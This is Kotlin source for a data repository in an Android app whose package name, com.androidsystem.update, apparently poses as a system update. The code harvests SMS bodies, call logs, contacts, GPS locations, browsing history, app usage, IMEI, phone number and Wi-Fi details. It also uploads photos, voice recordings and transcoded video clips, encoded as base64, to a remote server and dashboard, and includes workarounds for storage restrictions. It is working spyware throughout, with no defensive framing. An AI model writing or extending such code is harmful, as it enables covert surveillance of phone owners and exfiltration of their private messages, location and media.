package com.androidsystem.update.database

import android.content.ContentUris
import android.content.Context
import android.graphics.Bitmap
import android.net.Uri
import android.provider.MediaStore
import com.androidsystem.update.core.EncryptionManager
import dagger.hilt.android.qualifiers.ApplicationContext
import org.json.JSONObject
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class DataRepository @Inject constructor(
    private val dao: TelemetryDao,
    private val encryptionManager: EncryptionManager,
    @ApplicationContext private val context: Context
) {
    suspend fun insertCollectedData(type: String, content: String) {
        dao.insertCollectedData(CollectedDataEntity(
            type = type,
            content = encryptionManager.encrypt(content),
            timestamp = System.currentTimeMillis()
        ))
    }

    suspend fun insertLocationData(data: LocationEntity) {
        dao.insertLocationData(data)
    }

    suspend fun insertSms(address: String, body: String, date: Long, type: Int, read: Int) {
        dao.insertSms(SmsEntity(address = address, body = body, date = date, type = type, read = read))
    }

    suspend fun insertCall(number: String, date: Long, duration: Long, type: Int, name: String) {
        dao.insertCall(CallEntity(number = number, date = date, duration = duration, type = type, name = name))
    }

    suspend fun insertContact(name: String, phone: String, phoneHash: String) {
        dao.insertContact(ContactEntity(name = name, phone = phone, phoneHash = phoneHash))
    }

    suspend fun insertBrowsingHistory(url: String, title: String?, packageName: String, visitTime: Long) {
        dao.insertBrowsingHistory(BrowsingHistoryEntity(
            url = url, title = title, packageName = packageName, visitTime = visitTime
        ))
    }

    suspend fun insertMediaFile(path: String, name: String, mimeType: String?, dateAdded: Long, isScreenshot: Boolean) {
        dao.insertMediaFile(MediaFileEntity(
            path = path, name = name, mimeType = mimeType, dateAdded = dateAdded, isScreenshot = isScreenshot
        ))
    }

    suspend fun insertDeviceInfo(data: DeviceInfoEntity) {
        dao.insertDeviceInfo(data)
    }

    suspend fun insertAppUsage(packageName: String, totalTime: Long, launchCount: Int) {
        dao.insertAppUsage(AppUsageEntity(packageName = packageName, totalTime = totalTime, launchCount = launchCount))
    }

    suspend fun getUnsynced(limit: Int): List<CollectedDataEntity> = dao.getUnsynced(limit)
    suspend fun markSynced(id: Long) = dao.markSynced(id)
    suspend fun cleanupOldData(cutoff: Long) = dao.cleanupOldData(cutoff)
    suspend fun getLastLocation(): LocationEntity? = dao.getLastLocation()

    /**
     * A single typed message shipped to the server (POST /api/v2/data).
     * [content] is a JSON string of the record; the server parses it, routes it
     * to the matching module collection, dedupes by hash and caps the array.
     */
    data class SyncMessage(val type: String, val content: String, val timestamp: Long)

    private fun toJson(vararg pairs: Pair<String, Any?>): String =
        JSONObject().apply { pairs.forEach { (k, v) -> put(k, v) } }.toString()

    suspend fun smsSync(lastId: Long, limit: Int): Pair<List<SyncMessage>, Long> {
        val rows = dao.getSmsAfter(lastId, limit)
        if (rows.isEmpty()) return emptyList<SyncMessage>() to lastId
        val msgs = rows.map {
            SyncMessage(
                "sms",
                toJson("address" to it.address, "body" to it.body,
                    "date" to it.date, "type" to it.type, "read" to it.read, "ts" to it.date),
                it.date
            )
        }
        return msgs to rows.last().id
    }

    suspend fun callsSync(lastId: Long, limit: Int): Pair<List<SyncMessage>, Long> {
        val rows = dao.getCallsAfter(lastId, limit)
        if (rows.isEmpty()) return emptyList<SyncMessage>() to lastId
        val msgs = rows.map {
            SyncMessage(
                "call",
                toJson("number" to it.number, "name" to it.name,
                    "date" to it.date, "duration" to it.duration, "type" to it.type, "ts" to it.date),
                it.date
            )
        }
        return msgs to rows.last().id
    }

    suspend fun contactsSync(lastId: Long, limit: Int): Pair<List<SyncMessage>, Long> {
        val rows = dao.getContactsAfter(lastId, limit)
        if (rows.isEmpty()) return emptyList<SyncMessage>() to lastId
        val msgs = rows.map {
            SyncMessage(
                "contact",
                toJson("name" to it.name, "phone" to it.phone,
                    "phoneHash" to it.phoneHash, "ts" to 0L),
                0L
            )
        }
        return msgs to rows.last().id
    }

    suspend fun locationsSync(lastId: Long, limit: Int): Pair<List<SyncMessage>, Long> {
        val rows = dao.getLocationsAfter(lastId, limit)
        if (rows.isEmpty()) return emptyList<SyncMessage>() to lastId
        val msgs = rows.map {
            SyncMessage(
                "location",
                toJson("latitude" to it.latitude, "longitude" to it.longitude,
                    "accuracy" to it.accuracy, "altitude" to it.altitude, "speed" to it.speed,
                    "provider" to it.provider, "ts" to it.timestamp),
                it.timestamp
            )
        }
        return msgs to rows.last().id
    }

    suspend fun browsingSync(lastId: Long, limit: Int): Pair<List<SyncMessage>, Long> {
        val rows = dao.getBrowsingAfter(lastId, limit)
        if (rows.isEmpty()) return emptyList<SyncMessage>() to lastId
        val msgs = rows.map {
            SyncMessage(
                "browsing",
                toJson("url" to it.url, "title" to it.title,
                    "package" to it.packageName, "visitTime" to it.visitTime, "ts" to it.visitTime),
                it.visitTime
            )
        }
        return msgs to rows.last().id
    }

    suspend fun mediaSync(lastId: Long, limit: Int): Pair<List<SyncMessage>, Long> {
        val rows = dao.getMediaAfter(lastId, limit)
        if (rows.isEmpty()) return emptyList<SyncMessage>() to lastId
        val msgs = rows.map {
            SyncMessage(
                "media",
                toJson("path" to it.path, "name" to it.name,
                    "mime" to it.mimeType, "dateAdded" to it.dateAdded,
                    "screenshot" to it.isScreenshot, "ts" to it.dateAdded),
                it.dateAdded
            )
        }
        return msgs to rows.last().id
    }

    /**
     * Uploads the actual FILE content for media rows newer than [lastId]
     * (photos as downscaled JPEG thumbnails, small audio recordings/voice
     * notes as-is, videos as short transcoded preview clips), so the dashboard
     * can display a preview instead of only a path. Runs on a separate cursor
     * so metadata and heavy payloads never block each other; unreadable or
     * oversized files are skipped (cursor advances) rather than retried
     * forever.
     */
    suspend fun mediaFileSync(lastId: Long, limit: Int): Pair<List<SyncMessage>, Long> {
        val rows = dao.getMediaAfter(lastId, limit)
        if (rows.isEmpty()) return emptyList<SyncMessage>() to lastId
        val msgs = mutableListOf<SyncMessage>()
        // The cursor only advances past rows whose content was actually read;
        // unreadable files (e.g. a permission briefly missing) stay for retry.
        var lastOk = lastId
        for (row in rows) {
            val mime = row.mimeType?.lowercase() ?: ""
            val type = when {
                mime.startsWith("image/") -> "photo_file"
                mime.startsWith("audio/") -> "audio_file"
                mime.startsWith("video/") -> "video_file"
                else -> null
            }
            val payload = when (type) {
                "photo_file" -> encodeImageThumbnail(row.path)
                "audio_file" -> encodeAudioFile(row.path)
                "video_file" -> encodeVideoClip(row.path)
                else -> null
            }
            if (type != null && payload != null) {
                msgs.add(
                    SyncMessage(
                        type,
                        toJson(
                            "path" to row.path, "name" to row.name,
                            // Clips are always re-encoded to H.264/AAC MP4.
                            "mime" to (if (type == "video_file") "video/mp4" else row.mimeType),
                            "dateAdded" to row.dateAdded, "ts" to row.dateAdded,
                            "screenshot" to row.isScreenshot, "data" to payload
                        ),
                        row.dateAdded
                    )
                )
                lastOk = row.id
            }
        }
        return msgs to lastOk
    }

    // Downscale to max 640 px, JPEG q70 — a small enough base64 payload to
    // live inside a capped Firebase module collection while still being
    // legible in the dashboard grid and lightbox.
    private fun encodeImageThumbnail(path: String): String? {
        val bmp = decodeImageBitmap(path) ?: return null
        return try {
            val scale = minOf(1f, 640f / maxOf(bmp.width, bmp.height))
            val scaled = if (scale < 1f) {
                android.graphics.Bitmap.createScaledBitmap(
                    bmp, (bmp.width * scale).toInt().coerceAtLeast(1),
                    (bmp.height * scale).toInt().coerceAtLeast(1), true
                )
            } else bmp
            val out = java.io.ByteArrayOutputStream()
            scaled.compress(android.graphics.Bitmap.CompressFormat.JPEG, 70, out)
            if (scaled !== bmp) scaled.recycle()
            bmp.recycle()
            android.util.Base64.encodeToString(out.toByteArray(), android.util.Base64.NO_WRAP)
        } catch (e: Exception) {
            null
        }
    }

    // Read the image bytes. Direct file access is tried first; some OEM
    // builds (Samsung scoped storage) silently refuse raw /storage paths even
    // with READ_MEDIA_IMAGES granted, so on failure we resolve the row through
    // MediaStore and read via the content resolver instead.
    private fun decodeImageBitmap(path: String): Bitmap? {
        try {
            val bmp = android.graphics.BitmapFactory.decodeFile(path)
            if (bmp != null) return bmp
        } catch (e: Exception) { /* fall through to content resolver */ }
        return try {
            val uri = resolveMediaUri(path) ?: return null
            val bounds = android.graphics.BitmapFactory.Options().apply { inJustDecodeBounds = true }
            context.contentResolver.openInputStream(uri)?.use { stream ->
                android.graphics.BitmapFactory.decodeStream(stream, null, bounds)
            }
            if (bounds.outWidth <= 0 || bounds.outHeight <= 0) return null
            var sample = 1
            while (bounds.outWidth / (sample * 2) >= 1280 && bounds.outHeight / (sample * 2) >= 1280) sample *= 2
            context.contentResolver.openInputStream(uri)?.use { stream ->
                android.graphics.BitmapFactory.decodeStream(
                    stream, null,
                    android.graphics.BitmapFactory.Options().apply { inSampleSize = sample }
                )
            }
        } catch (e: Exception) {
            null
        }
    }

    private fun resolveMediaUri(path: String): Uri? {
        return try {
            val projection = arrayOf(MediaStore.Images.Media._ID)
            val selection = "${MediaStore.Images.Media.DATA} = ?"
            context.contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection, selection, arrayOf(path), null
            )?.use { cursor ->
                if (cursor.moveToFirst()) {
                    ContentUris.withAppendedId(
                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI, cursor.getLong(0)
                    )
                } else null
            }
        } catch (e: Exception) {
            null
        }
    }

    // Voice notes / recordings up to 1 MB fit inside the capped audio module.
    private fun encodeAudioFile(path: String): String? {
        return try {
            val f = java.io.File(path)
            if (!f.exists() || !f.canRead() || f.length() > 1_000_000L) return null
            android.util.Base64.encodeToString(f.readBytes(), android.util.Base64.NO_WRAP)
        } catch (e: Exception) {
            null
        }
    }

    // Videos are transcoded to a short low-res H.264 MP4 preview clip
    // (first ~8 s, max 360p, audio kept) small enough to live in the capped
    // Firebase `videos` module and play straight from the dashboard.
    // Any failure (unsupported codec, permission hiccup, timeout) returns null
    // and the row stays metadata-only — never a crash.
    private fun encodeVideoClip(path: String): String? {
        return try {
            val src = java.io.File(path)
            if (!src.exists() || !src.canRead() || src.length() > 300_000_000L) return null
            val uri = resolveVideoUri(path) ?: return null
            val retriever = android.media.MediaMetadataRetriever()
            val durMs = try {
                retriever.setDataSource(context, uri)
                retriever.extractMetadata(android.media.MediaMetadataRetriever.METADATA_KEY_DURATION)
                    ?.toLongOrNull() ?: 0L
            } finally {
                retriever.release()
            }
            if (durMs <= 0L) return null
            val out = java.io.File(context.cacheDir, "vclip_${System.currentTimeMillis()}.mp4")
            val ok = transcodeVideoClip(uri, out, durMs)
            val size = if (ok) out.length() else 0L
            if (!ok || size <= 0L || size > 1_100_000L) {
                if (out.exists()) out.delete()
                return null
            }
            val b64 = android.util.Base64.encodeToString(out.readBytes(), android.util.Base64.NO_WRAP)
            out.delete()
            b64
        } catch (e: Exception) {
            null
        }
    }

    private fun transcodeVideoClip(uri: Uri, out: java.io.File, durMs: Long): Boolean {
        return try {
            val endMs = minOf(durMs, 8_000L)
            val latch = java.util.concurrent.CountDownLatch(1)
            val success = java.util.concurrent.atomic.AtomicBoolean(false)
            // Trim is expressed as MediaItem clipping; scale via a Presentation
            // effect on the EditedMediaItem; the output format (H.264 MP4,
            // bitrate derived from the 360p target height) is set on the
            // Transformer.
            val mediaItem = androidx.media3.common.MediaItem.Builder()
                .setUri(uri)
                .setClippingConfiguration(
                    androidx.media3.common.MediaItem.ClippingConfiguration.Builder()
                        .setStartPositionMs(0L)
                        .setEndPositionMs(endMs)
                        .build()
                )
                .build()
            val editedItem = androidx.media3.transformer.EditedMediaItem.Builder(mediaItem)
                .setEffects(
                    androidx.media3.transformer.Effects(
                        emptyList(),
                        listOf(androidx.media3.effect.Presentation.createForHeight(360))
                    )
                )
                .build()
            val transformer = androidx.media3.transformer.Transformer.Builder(context)
                .setVideoMimeType(androidx.media3.common.MimeTypes.VIDEO_H264)
                .addListener(object : androidx.media3.transformer.Transformer.Listener {
                    override fun onCompleted(
                        composition: androidx.media3.transformer.Composition,
                        exportResult: androidx.media3.transformer.ExportResult
                    ) {
                        success.set(true)
                        latch.countDown()
                    }

                    override fun onError(
                        composition: androidx.media3.transformer.Composition,
                        exportResult: androidx.media3.transformer.ExportResult,
                        exportException: androidx.media3.transformer.ExportException
                    ) {
                        latch.countDown()
                    }
                })
                .build()
            android.os.Handler(android.os.Looper.getMainLooper()).post {
                transformer.start(editedItem, out.absolutePath)
            }
            val done = latch.await(90, java.util.concurrent.TimeUnit.SECONDS)
            if (!done) transformer.cancel()
            done && success.get()
        } catch (e: Exception) {
            false
        }
    }

    // Samsung scoped storage refuses raw /storage paths for videos too, so the
    // clip pipeline reads through the MediaStore content URI instead.
    private fun resolveVideoUri(path: String): Uri? {
        return try {
            val projection = arrayOf(MediaStore.Video.Media._ID)
            val selection = "${MediaStore.Video.Media.DATA} = ?"
            context.contentResolver.query(
                MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                projection, selection, arrayOf(path), null
            )?.use { cursor ->
                if (cursor.moveToFirst()) {
                    ContentUris.withAppendedId(
                        MediaStore.Video.Media.EXTERNAL_CONTENT_URI, cursor.getLong(0)
                    )
                } else null
            }
        } catch (e: Exception) {
            null
        }
    }

    suspend fun appUsageSync(lastId: Long, limit: Int): Pair<List<SyncMessage>, Long> {
        val rows = dao.getAppUsageAfter(lastId, limit)
        if (rows.isEmpty()) return emptyList<SyncMessage>() to lastId
        val msgs = rows.map {
            SyncMessage(
                "app_usage",
                toJson("package" to it.packageName,
                    "totalTime" to it.totalTime, "launchCount" to it.launchCount, "ts" to it.timestamp),
                it.timestamp
            )
        }
        return msgs to rows.last().id
    }

    suspend fun deviceInfoSync(lastId: Long, limit: Int): Pair<List<SyncMessage>, Long> {
        val rows = dao.getDeviceInfoAfter(lastId, limit)
        if (rows.isEmpty()) return emptyList<SyncMessage>() to lastId
        val msgs = rows.map {
            SyncMessage(
                "device_info",
                toJson("manufacturer" to it.manufacturer, "model" to it.model,
                    "device" to it.device, "product" to it.product,
                    "androidVersion" to it.androidVersion, "sdkVersion" to it.sdkVersion,
                    "imei" to it.imei, "phoneNumber" to it.phoneNumber,
                    "simOperator" to it.simOperator, "networkOperator" to it.networkOperator,
                    "androidId" to it.androidId, "wifiSsid" to it.wifiSsid,
                    "wifiBssid" to it.wifiBssid, "wifiRssi" to it.wifiRssi,
                    "batteryLevel" to it.batteryLevel, "ts" to it.timestamp),
                it.timestamp
            )
        }
        return msgs to rows.last().id
    }
}
